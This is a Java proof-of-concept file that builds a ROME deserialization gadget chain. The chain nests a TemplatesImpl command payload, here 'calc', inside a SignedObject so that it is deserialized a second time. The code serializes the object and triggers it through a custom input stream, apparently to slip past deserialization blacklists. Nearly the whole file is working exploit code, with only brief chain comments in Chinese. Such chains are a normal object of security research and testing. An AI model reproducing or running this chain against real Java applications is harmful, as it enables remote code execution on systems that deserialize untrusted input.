package gadget.doubleunser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.security.*;

/*
* BadAttributeValueExpException#readObject
* ToStringBean#toString
* SignedObject#getObject
* 二次反序列化
** BadAttributeValueExpException#readObject
* ToStringBean#toString
* TemplatesImpl-->getOutputProperties()
	TemplatesImpl-->newTransformer()
        TemplatesImpl-->getTransletInstance()
            TemplatesImpl-->defineTransletClasses()
                TemplatesImpl-->defineClass()
*
* */
public class rometoSignedObject1 {
    public static void main(String[] args) throws NoSuchAlgorithmException, NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException, ClassNotFoundException, SignatureException, InvalidKeyException {

        TemplatesImpl templates = GadgetUtils.createTemplatesImpl("calc");
        ToStringBean toStringBean2 = new ToStringBean(Templates.class,templates);

        BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(null);
        ReflectionUtils.setFieldValue(badAttributeValueExpException2,"val",toStringBean2);

        //二次反序列化
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(badAttributeValueExpException2, kp.getPrivate(), Signature.getInstance("DSA"));

        //触发SignedObject#getObject
        ToStringBean toStringBean1 = new ToStringBean(SignedObject.class,signedObject);

        BadAttributeValueExpException badAttributeValueExpException1 = new BadAttributeValueExpException(null);
        ReflectionUtils.setFieldValue(badAttributeValueExpException1,"val",toStringBean1);

        byte[] payload = SerializerUtils.serialize(badAttributeValueExpException1);

//        SerializerUtils.unserialize(payload);
        ObjectInputStream ois = new MyInputStream(new ByteArrayInputStream(payload));
        ois.readObject();
    }
}
